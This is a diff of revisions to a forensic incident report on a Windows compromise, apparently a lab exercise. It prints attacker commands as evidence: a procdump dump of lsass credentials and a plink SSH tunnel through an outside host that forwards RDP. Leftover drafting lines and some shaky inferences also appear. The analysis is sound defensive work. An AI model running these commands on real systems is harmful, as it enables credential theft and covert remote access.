@@ -110,8 +110,6 @@ This report outlines the sequence of events that led to the compromise of a syst
    **Analysis:**
    - The creation of the `ScvHost` service was a critical step in maintaining the attacker’s control over the compromised system. This service, running under the highly privileged `LocalSystem` account, ensured that the malicious payloads could continue operating even after a system reboot.
 
----
-
 #### **Conclusion**
 
 The system was compromised through a well-orchestrated attack that began with the user's interaction with a legitimate website, which led to the execution of a malicious advertisement script. This script redirected the user to a malicious file-sharing site, where `resume.doc.exe` was downloaded. Subsequent execution of the file initiated a series of PowerShell commands that downloaded and executed additional malicious scripts from Pastebin, ultimately establishing persistence on the system through the `ScvHost` service.
@@ -125,26 +123,19 @@ The system was compromised through a well-orchestrated attack that began with th
 - **PowerShell Scripts from Pastebin:**
   - **Base64 Decoded Scripts:** `sticky.ps1`, `Service.ps1`, etc.
 
-###
-Below is the revised draft for **Question 2** of the report, updated to include all necessary details about `plink.exe` and its role in the compromise:
-
 ---
 
-### **Technical Incident Report: Extent of the Compromise**
+## **2. What Was the Extent of the Compromise?**
 
----
-
-#### **2. What Was the Extent of the Compromise?**
-
-The compromise of the system was extensive, involving multiple stages that allowed the attacker to disable security features, persistently control the system, and establish remote access for further exploitation. The attacker used a combination of PowerShell scripts, malicious executables, and SSH tunneling to ensure deep and sustained access to the compromised system.
+The compromise of the system was extensive, involving multiple stages that allowed the attacker to disable security features, persistently control the system, and establish remote access for further exploitation. The attacker used a combination of PowerShell scripts, malicious executables, memory dumping tools, and SSH tunneling to ensure deep and sustained access to the compromised system.
 
 ---
 
 ### **Second and Third Stage of Infection**
 
-The second and third stages of the infection involved the execution of PowerShell scripts to disable security mechanisms and establish persistence, followed by the deployment of a backdoor and the setup of an SSH tunnel for remote control.
+The second and third stages of the infection involved the execution of PowerShell scripts to disable security mechanisms and establish persistence, followed by the deployment of a backdoor, memory dumping, and the setup of an SSH tunnel for remote control and potential data exfiltration.
 
-#### **Second Stage: Execution of Malicious PowerShell Scripts**
+#### **Second Stage: Execution of Malicious PowerShell Scripts and Memory Dumping**
 
 1. **Execution of `vagrant-shell.ps1`:**
    - **Execution Context:** The `vagrant-shell.ps1` script was executed to disable various security features, particularly those related to Windows Defender. This script neutralized the system's defenses, allowing the attacker to proceed with further malicious actions without being detected.
@@ -185,30 +176,55 @@ The second and third stages of the infection involved the execution of PowerShel
      Script Path: C:\Users\Alan\AppData\Local\Temp\Service.ps1
      ```
 
+5. **Execution of `procdump64.exe` and Memory Dumping:**
+   - **Execution Context:** The `procdump64.exe` tool, a legitimate Sysinternals utility, was used by the attacker to create a memory dump of the `lsass.exe` process. This process is critical for managing user authentication and security policies, and its memory typically contains sensitive credentials.
+   - **Evidence:**
+     - **Prefetch Files:** The execution of `procdump64.exe` was confirmed through the presence of a Prefetch file `PROCDUMP64.EXE-7C654F89.pf`, which indicates that the tool was run on `17/08/2019` at `6:00:34 AM`.
+     - **USN Journal Entries:** The USN Journal confirms the creation of `procdump64.exe` and its use around `5:59:54 AM`, closely preceding the creation of the memory dump.
+     - **Jump Lists and LNK Files:** Evidence from Jump Lists and LNK files shows the creation and access of `lsass.zip`, likely indicating that the `lsass.dmp` file was compressed, potentially for exfiltration.
+     ```plaintext
+     Execution Time: 2019-08-17 06:00:34 AM (UTC)
+     File Path: C:\Users\Craig\Desktop\Procdump\procdump64.exe
+     ```
+
+   - **Impact:** The creation of the `lsass.dmp` file suggests that the attacker was able to extract plaintext credentials and other sensitive information from memory. This action, combined with the creation of `lsass.zip`, indicates a high likelihood of data exfiltration or preparation for such.
+
+
+---
+
 #### **Third Stage: Deployment of Backdoor and Establishment of Remote Access**
 
 1. **Download and Execution of `scvhost.exe`:**
    - **Execution Context:** The `scvhost.exe` file, maliciously named to mimic the legitimate Windows process `svchost.exe`, was downloaded and executed. This file served as a backdoor, providing the attacker with persistent remote access to the compromised system.
    - **Evidence:**
-     - **File Analysis:** The presence and execution of `scvhost.exe` were confirmed through memory and disk analysis. Unlike the legitimate `svchost.exe` located in `C:\Windows\System32\`, this version was found in `C:\Users\Alan\AppData\Local\Temp\` and was flagged as malicious by multiple antivirus engines.
-     - **Impact:** The execution of `scvhost.exe` allowed the attacker to maintain a backdoor for remote control.
+     - **Memory Artifacts and File Analysis:** The presence and execution of `scvhost.exe` were confirmed through both memory and disk analysis. Unlike the legitimate `svchost.exe` located in `C:\Windows\System32\`, this malicious version was found in `C:\Users\Alan\AppData\Local\Temp\` and was flagged as malicious by multiple antivirus engines.
+       - **Process Information:** The `scvhost.exe` process (PID 1840) was active between `5:49:18 AM` and `5:49:48 AM` on `17/08/2019`. The process was short-lived, running for only 30 seconds, indicating it was designed to execute a quick task—likely initializing or maintaining a backdoor connection.
+       - **Evasion Techniques:** Memory analysis revealed that `scvhost.exe` employed evasion techniques to remain partially hidden from certain process enumeration tools, being visible in the standard process list (`Pslist`) but not detected by others like `Psscan` or `Thrdproc`.
+     - **Impact:** The execution of `scvhost.exe` allowed the attacker to maintain a covert backdoor for remote control, leveraging its brief and hidden activity to avoid detection while sustaining access to the compromised system.
      ```plaintext
      File Name: scvhost.exe
      File Path: C:\Users\Alan\AppData\Local\Temp\scvhost.exe
+     Process ID (PID): 1840
+     Process Start Time: 17/08/2019 5:49:18 AM
+     Process End Time: 17/08/2019 5:49:48 AM
+     Evasion: Partially hidden (Not detected by Psscan and Thrdproc)
      ```
 
 2. **Establishment of SSH Tunnel Using `plink.exe`:**
    - **Execution Context:** The `plink.exe` executable was used to create an SSH tunnel that forwarded a local port (127.0.0.1:12345) to a remote IP (10.2.0.2:3389), effectively enabling remote desktop access over RDP. This port forwarding facilitated unauthorized remote access to the system.
    - **Evidence:**
-     - **Prefetch Files:** The execution of `plink.exe` was confirmed via prefetch files, which indicated it was run from `\Windows\Temp\`.
-     - **Command-Line Arguments:** The command-line arguments used with `plink.exe` specified the SSH connection to the remote server `69.50.64.20` on port `22` and the forwarding of traffic to port `3389`, the default port for RDP.
+     - **Execution Context:** The `plink.exe` tool was executed from `\Windows\Temp\`, with command-line arguments that set up an SSH tunnel, forwarding traffic from `127.0.0.1:12345` to `10.2.0.2:3389` via the remote server `69.50.64.20` on port `22`.
+       - **Memory Analysis:** Memory artifacts showed that `plink.exe` had loaded several critical DLLs, including `ntdll.dll`, `kernel32.dll`, and `crypt32.dll`, indicating that it was actively engaged in system-level operations and potentially managing encrypted communications.
+       - **Significance:** The memory artifacts also suggest that the `scvhost.exe` process may have played a role in initializing or maintaining the SSH tunnel created by `plink.exe`, further supporting the attacker's efforts to sustain remote access and exfiltrate data.
+     - **Impact:** The execution of `plink.exe` and its use for SSH tunneling and RDP forwarding were critical in ensuring the attacker could maintain control over the compromised system. This persistence mechanism allowed the attacker to bypass network defenses and potentially exfiltrate data or execute further commands remotely. The forwarding of traffic to port `3389`, the default port for RDP, suggests that the attacker established a Remote Desktop Protocol (RDP) connection, providing them with full remote control of the system.
      ```plaintext
      Execution Time: 2019-08-17 05:52:31 AM (UTC)
      File Path: \Windows\Temp\plink.exe
      Command: plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389
      ```
 
-   - **Significance:** The execution of `plink.exe` and its use for SSH tunneling and RDP forwarding were critical in ensuring the attacker could maintain control over the compromised system. This persistence mechanism allowed the attacker to bypass network defenses and potentially exfiltrate data or execute further commands remotely. The fact that the forwarded port was 3389, the default port for RDP, indicates the attacker was specifically aiming to enable remote desktop access, which is a strong indication of the sophistication and intent behind the compromise.
+
+   - **Significance:** The execution of `plink.exe` and its use for SSH tunneling and RDP forwarding were pivotal in ensuring the attacker could maintain and sustain remote control over the compromised system. This persistence mechanism, reinforced by the brief but critical execution of `scvhost.exe`, allowed the attacker to bypass network defenses and securely exfiltrate data or execute further commands remotely. The fact that the forwarded port was 3389, the default port for RDP, strongly indicates that the attacker intended to establish Remote Desktop access. This highlights the sophistication and deliberate intent behind the compromise, underscoring the attacker's focus on maintaining long-term access and control.
 
 ---
 
@@ -217,28 +233,28 @@ The second and third stages of the infection involved the execution of PowerShel
 1. **Execution of Malicious Scripts and Files:**
    - **PowerShell Scripts:** The attacker executed multiple PowerShell scripts (`vagrant-shell.ps1`, `WinRM_Elevated_Shell.ps1`, `Sticky.ps1`, `Service.ps1`) to disable security features, establish persistence, and create a backdoor.
    - **Malicious Executables:** The attacker deployed and executed `scvhost.exe`, a malicious backdoor that mimicked a legitimate Windows process.
-
-2. **Establishment of Persistence:**
-   - **Service Creation:** The attacker used the `Service.ps1` script to create a persistent service (`ScvHost`), ensuring that the backdoor would remain active even after system reboots.
-   - **IFEO Modification:** The attacker modified the IFEO registry key using `Sticky.ps1`, replacing `sethc.exe` with `cmd.exe` to gain easy access to a command prompt with elevated privileges.
-
-3. **Establishment of Remote Access:**
-   - **SSH Tunnel Creation:** The attacker used `plink.exe` to create an SSH tunnel that forwarded RDP traffic, enabling remote desktop access over port `3389`.
-   - **C2 Communication:** The `scvhost.exe` backdoor communicated with the C2 server at `69.50.64.20`, allowing the attacker to issue commands and maintain control over the compromised system.
+   - **Memory Dumping:** The attacker used `procdump64.exe` to dump the memory of the `lsass.exe` process, capturing sensitive credentials likely stored in memory.
 
 ---
 
+2. **Establishment of Persistence:**
+   - **Service Creation:** The attacker used the `Service.ps1` script to create a persistent service (`ScvHost`), ensuring that the backdoor (`scvhost.exe`) would remain active even after system reboots.
+   - **IFEO Modification:** The attacker modified the IFEO (Image File Execution Options) registry key using `Sticky.ps1`, replacing `sethc.exe` with `cmd.exe` to gain easy access to a command prompt with elevated privileges from the login screen.
+
+3. **Establishment of Remote Access:**
+   - **SSH Tunnel Creation:** The attacker used `plink.exe` to create an SSH tunnel that forwarded RDP traffic, enabling remote desktop access over port `3389`. This allowed the attacker to maintain a persistent connection to the compromised system.
+   - **C2 Communication:** The `scvhost.exe` backdoor communicated with a Command and Control (C2) server at `69.50.64.20`, facilitating the execution of remote commands and potentially exfiltrating data from the compromised system.
+
+
 ### **Conclusion**
 
-The extent of the compromise was severe, involving multiple stages of infection that effectively disabled the system's defenses, established persistent backdoors, and enabled remote access through an SSH tunnel. The attacker's use of PowerShell scripts and malicious executables, combined with the creation of an SSH tunnel via `plink.exe`, allowed for sustained control over the compromised system. The communication with a C2 server further indicates that the attacker maintained ongoing remote access, potentially for data exfiltration or further exploitation.
+The extent of the compromise was severe, involving multiple stages of infection that effectively disabled the system's defenses, established persistent backdoors, and enabled remote access through an SSH tunnel. The attacker's use of PowerShell scripts and malicious executables, combined with the creation of an SSH tunnel via `plink.exe`, allowed for sustained control over the compromised system. The execution of `procdump64.exe` to dump the memory of `lsass.exe` provided the attacker with access to sensitive credentials, which could be used for further exploitation or lateral movement within the network. The communication with a C2 server further indicates that the attacker maintained ongoing remote access, potentially for data exfiltration or further exploitation.
 
 This report highlights the sophisticated nature of the attack, the methods used to bypass security measures, and the extent of the system compromise. The evidence gathered from PowerShell logs, memory analysis, and network traffic provides a detailed understanding of the attack's progression and impact.
 
 ---
 
-
-
-Below is the revised draft for **Question 3** of the report, updated with the new information provided regarding `Procdump64.exe`, `plink.exe`, and the analysis of potential data exfiltration:
+Here’s the updated and revised **Question 3** with the new data seamlessly integrated:
 
 ---
 
@@ -248,7 +264,7 @@ Below is the revised draft for **Question 3** of the report, updated with the ne
 
 #### **3. Was Anything Taken?**
 
-The investigation into the compromised system revealed that sensitive information was likely stolen from the host. The attacker used various tools and methods to extract and potentially exfiltrate critical data, including credential dumps and remote access through an SSH tunnel.
+The investigation into the compromised system revealed that sensitive information was likely stolen from the host. The attacker used various tools and methods to extract and potentially exfiltrate critical data, including credential dumps, remote access through an SSH tunnel, and possible file transfers. 
 
 ---
 
@@ -256,7 +272,7 @@ The investigation into the compromised system revealed that sensitive informatio
 
 #### **1. Credential Dumping via `Procdump`**
 
-One of the most critical pieces of evidence pointing to data exfiltration is the use of `Procdump`, a Sysinternals tool, to dump the memory of the `lsass.exe` process. The Local Security Authority Subsystem Service (LSASS) is responsible for enforcing security policies on the system, including managing user logins, password changes, and generating access tokens. By dumping the memory of `lsass.exe`, the attacker could extract plaintext passwords and other authentication tokens, which could then be used for lateral movement within the network or for further exploitation.
+One of the most critical pieces of evidence pointing to data exfiltration is the use of `procdump64.exe`, a Sysinternals tool, to dump the memory of the `lsass.exe` process. The Local Security Authority Subsystem Service (LSASS) is responsible for enforcing security policies on the system, including managing user logins, password changes, and generating access tokens. By dumping the memory of `lsass.exe`, the attacker could extract plaintext passwords and other authentication tokens, which could then be used for lateral movement within the network or for further exploitation.
 
 - **Evidence:**
   - **Command History:**
@@ -273,17 +289,20 @@ One of the most critical pieces of evidence pointing to data exfiltration is the
     .\procdump64.exe -ma -accepteula lsass.exe lsass.dmp
     ```
 
-  - **Location:**
-    The `ConsoleHost_history.txt` file was found at `C:\Users\Craig\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`, providing a direct record of the attacker's actions.
+  - **Prefetch Files:**
+    The execution of `procdump64.exe` was confirmed by Prefetch files, indicating that the tool was run on `17/08/2019` at `6:00:34 AM`. This corroborates the timeline established from the command history.
+
+  - **USN Journal Entries and Other Artifacts:**
+    USN Journal entries confirm the creation of `procdump64.exe` at `5:59:54 AM`, followed by actions suggesting the creation and subsequent access of `lsass.zip`, a file likely containing the compressed memory dump (`lsass.dmp`).
 
   - **Impact:**
     - **Credential Theft:**
-      The `lsass.dmp` file would likely contain plaintext passwords, NTLM hashes, and Kerberos tickets, enabling the attacker to impersonate users and access additional systems within the network.
+      The `lsass.dmp` file likely contained plaintext passwords, NTLM hashes, and Kerberos tickets, enabling the attacker to impersonate users and access additional systems within the network.
     - **Further Compromise:**
       With these credentials, the attacker could perform lateral movement, escalate privileges, or exfiltrate additional data.
 
 - **Investigation Outcome:**
-  - Despite analyzing network traffic using Wireshark and searching for potential exfiltration activity, no conclusive evidence was found that `lsass.dmp` was transmitted over the network. The absence of data exfiltration evidence suggests that either the exfiltration did not occur via standard network channels, or alternative methods were used that were not captured during the investigation.
+  - Despite analyzing network traffic using Wireshark and searching for potential exfiltration activity, no conclusive evidence was found that `lsass.dmp` was transmitted over the network. This absence of data exfiltration evidence suggests that either the exfiltration did not occur via standard network channels or alternative methods were used that were not captured during the investigation.
 
 ---
 
